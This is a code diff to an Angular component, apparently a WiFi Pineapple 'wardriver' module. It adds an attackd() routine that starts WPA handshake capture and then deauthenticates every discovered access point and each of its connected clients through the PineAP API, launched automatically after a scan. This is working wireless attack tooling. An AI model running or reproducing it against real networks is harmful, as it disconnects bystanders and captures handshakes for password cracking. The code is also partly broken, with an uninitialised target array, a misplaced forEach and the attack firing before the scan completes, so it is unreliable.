@@ -1,7 +1,9 @@
 import { Component, OnInit, NgModule } from '@angular/core'; 
 import { ApiService } from '../services/api.service'; 
 import { StatusRootObject, Header, Message } from '../interfaces/status.interface';
+import { APResult } from '../interfaces/reconresult.interface';
 import { exit } from 'process';
+import { throws } from 'assert';
 
 @Component({ 
     selector: 'lib-wardriver', 
@@ -15,13 +17,14 @@ export class WarDriverComponent implements OnInit {
     statusHeader: string = '';
     statusFileName: string = '';
     json_frontend: StatusRootObject;
+    scanResultsArray: Array<APResult>;
 
     populateTargetBSSIDs(): void {
         this.API.APIGet('/api/pineap/ssids', (resp) => {
             this.apiResponse = resp.ssids;
         });
     }
- 
+
     get_status_file_name(): string {
         this.API.request({
             module: 'wardriver',
@@ -49,7 +52,38 @@ export class WarDriverComponent implements OnInit {
         this.get_status_file(statusFileName);
         //this.render_status();
     }
+    attackd(): void {
+        this.API.APIGet('/api/pineap/handshakes', (resp) => {  // start handshake capture
+            if (resp.handshakes != null) {
+                this.scanResultsArray.forEach(ap => {
+                    let ap_deauth_payload = { // build ap deauth payload
+                        bssid: ap.bssid,
+                        multiplier: 1,
+                        channel: 11,
+                        clients: []
+                    }
+                    this.API.APIPost('/api/pineap/deauth/ap', ap_deauth_payload, (resp) => {  // deauth the ap
+                        console.log('>ap deauthd: ' +ap.bssid)
+                    }).forEach(client => {
+                        let client_deauth_payload = {
+                            bssid: ap.bssid,
+                            mac: client.client_mac,
+                            multiplier: 1,
+                            channel: 11
+                        }
+                        this.API.APIPost('/api/pineap/deauth/client', client_deauth_payload, (resp) => {
 
+                        });
+                    });
+                });
+            }
+        });
+                        // deauth bssid
+                        // loop through clients, deauth each
+                        // stop handshakes
+                        // check for handshakes               
+    }
+    
     run_scand(): void {
         const scan_opts = {
             "live":false,
@@ -77,7 +111,8 @@ export class WarDriverComponent implements OnInit {
                 'target_mac': 'FF:FF:FF:FF:FF:FF' 
             }
         }
-
+        
+        
         this.API.APIPut('/api/pineap/settings', pineAP_aggro_settings, (resp) => {
             this.API.APIPost('/api/recon/stop', null, (resp) => {
                 this.API.APIPost('/api/recon/start', scan_opts, (resp) => {
@@ -88,20 +123,24 @@ export class WarDriverComponent implements OnInit {
                         if (resp.APResults.length > 0) {
                             resp.APResults.forEach(ap => {
                                 if (ap.clients != null) {
-                                    console.log('>apclient');
                                     ap.clients.forEach(client => {
                                         console.log('>client found!: ' + client.client_mac);
+                                        this.scanResultsArray.push(ap);
                                     });
                                 }
-                                else { console.log('>APs found, but not with associated clients'); }
+                                else { console.log('>AP found, but not with associated clients'); }
                             });
                         }
                         else { console.log('>no APs found'); }
                     })}, 120000);
-                })
-            })
+                
+                this.API.APIPost('/api/recon/stop', null, (resp) => { }); 
+            });
         });
-    }
+    });    
+    if (this.scanResultsArray.length > 0) this.attackd()
+    else console.log('>sorry, nothing to attack');
+}
 
     ngOnInit() { 
         this.populateTargetBSSIDs();
